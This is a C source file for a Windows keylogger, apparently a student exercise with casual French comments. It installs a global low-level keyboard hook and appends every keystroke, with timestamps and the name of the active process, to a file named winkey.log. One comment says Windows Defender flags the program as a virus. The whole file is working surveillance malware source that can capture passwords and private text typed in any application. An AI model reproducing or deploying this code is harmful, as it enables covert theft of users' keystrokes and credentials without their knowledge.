#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
#include <winsvc.h>
#include <psapi.h>
#include <time.h>

// un jour je ferais le .h insha'Allah

const char *winkey = "winkey.log";
DWORD lastPid = 0;

void	AffProcessName(DWORD processID, const char *path)
{
	/*
		function qui affiche le process name ouais j'ai rien à dire
		#OnFarmLeGit
	*/
	FILE *file = fopen(path, "a");
	if (!file)
		return ;
	char	szProcessName[MAX_PATH] = "<inconnu>";


	time_t	now = time(NULL);
	struct tm t;
	localtime_s(&t, &now);
	char	buf[32];
	strftime(buf, sizeof(buf), "[%d.%m.%Y %H:%M:%S]", &t);
	fprintf(file, "\nTime : %s" ,buf);
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);

	if (hProcess) {
		HMODULE hmod;
		DWORD	cbNeeded;

		if (EnumProcessModules(hProcess, &hmod, sizeof(hmod), &cbNeeded))
			GetModuleBaseNameA(hProcess, hmod, szProcessName, sizeof(szProcessName));
		CloseHandle(hProcess);
	}

	fprintf(file, "\nPID %lu: %s\n", processID, szProcessName);
	fclose(file);
}

int    forground_process(void)
{
	/*
		function qui permet de récup et d'afficher le forground process
		(le nom de la fenetre dans laquelle on se trouve btw)
	*/
	HWND    hwnd;
	DWORD   pid;
	WCHAR	title[256] = L"";

	hwnd = GetForegroundWindow();

	if (!hwnd) {
		GetWindowTextW(hwnd, title, 256);
		wprintf(L"fenetre active : %ls\n", title);
	}

	GetWindowThreadProcessId(hwnd, &pid);
	AffProcessName(pid, winkey);

	/*printf("hwnd: %p\n", (void*)hwnd);
	printf("pid: %lu\n", (unsigned long)pid);*/
	return 0;
}

int write_key(const char *path, int vkCode)
{
	/*
		t'sais le mec qui croit qu'on est en python + rp claude
		write_key permet d'écrire toute les entrées claviers dans
		le fichier -> "path"
	*/
    FILE *file = fopen(path, "a");
    if (!file)
        return 1;

    if (vkCode >= 'A' && vkCode <= 'Z') {
        fprintf(file, "%c", vkCode);
	}
    else if (vkCode >= '0' && vkCode <= '9') {
        fprintf(file, "%c", vkCode);
	}
	else if (!vkCode)
		fprintf(file, "\n");

    else
	{
        switch (vkCode)
		{
            case VK_SPACE: fprintf(file, " "); break;
            case VK_RETURN: fprintf(file, "\n"); break;
            case VK_TAB: fprintf(file, "[TAB]"); break;
            case VK_BACK: fprintf(file, "[BACK]"); break;
            case VK_SHIFT: fprintf(file, "[SHIFT]"); break;
            case VK_CONTROL: fprintf(file, "[CTRL]"); break;
			case VK_RCONTROL: fprintf(file, "[RCTRL]"); break;
			case VK_LCONTROL: fprintf(file, "[LCTRL]"); break;
            case VK_MENU: fprintf(file, "[ALT]"); break;
			case VK_UP: fprintf(file, "[UP]"); break;
			case VK_DOWN: fprintf(file, "[DOWN]"); break;
			case VK_LEFT: fprintf(file, "[LEFT]"); break;
			case VK_RIGHT: fprintf(file, "[RIGHT]"); break;
            default: fprintf(file, "<%d>", vkCode); break;
        }
    }
    fclose(file);
    return 0;
}

int write_in_file(const char *path, MSG msg)
{
	/*
		je voulais faire un truc avec cette fonction mais ca fonctionne pas
		en tout cas quand je l'a supp windows defender détecte que c'est
		un virus et ca se lance pas sans ;-;
	*/
	FILE *file = fopen(path, "a");
	if (!file) {
		perror("can't open file");
		return 1;
	}

	if (fprintf(file, "%u\n", msg.message) < 0) {
		perror("error");
		fclose(file);
		return 1;
	}
	if (fclose(file) != 0) {
		perror("error close file");
		return 1;
	}
	return 0;
}

LRESULT CALLBACK foo(int ncode, WPARAM wparam, LPARAM lparam)
{
	/*
		ca utilise tout ce qu'il y a avant pour en faire un seul bloc
		la function de goat finallement
	*/
    int		vkCode = ((KBDLLHOOKSTRUCT *)lparam)->vkCode;

	if (wparam == WM_KEYUP) {
        HWND hwnd = GetForegroundWindow();
        DWORD pid = 0;
        GetWindowThreadProcessId(hwnd, &pid);
		if (pid != lastPid) {
			FILE *file = fopen(winkey, "a");
			if (file) {
				fprintf(file, "\n");
				fclose(file);
			}
			AffProcessName(pid, winkey);
			lastPid = pid;
		}
		write_key(winkey, vkCode);
	}
    return (CallNextHookEx(NULL, ncode, wparam, lparam));
}

int	create_file(const char *path) {
	/*
		crée le fichier winkey.log situ
	*/
	FILE *f = fopen(path, "w");
	if (f == NULL)
	{
		perror("Can't create file");
		return 1;
	}
	return 0;
}


int main(void)
{
	/*
		la main function quoi classique
	*/
    HHOOK hook = SetWindowsHookEx(
        WH_KEYBOARD_LL, // Type de hook
        foo,            // Fonction a appeler
        NULL,            // Ou trouver la fonction (null car osef)
        0);                // Thread ID
    MSG msg;

    if (hook == NULL)
    {
        printf("Failed to install hook: %ld\n", GetLastError());
        return 1;
    }

    printf("Hook ok: %p\n", (void*)hook);
	create_file(winkey);
    while (GetMessage(&msg, NULL, 0, 0))
    {
		write_in_file(winkey, msg);
        //forground_process();
        TranslateMessage(&msg); // jsp ca fais quoi sah
    }
    printf("haha\n");
}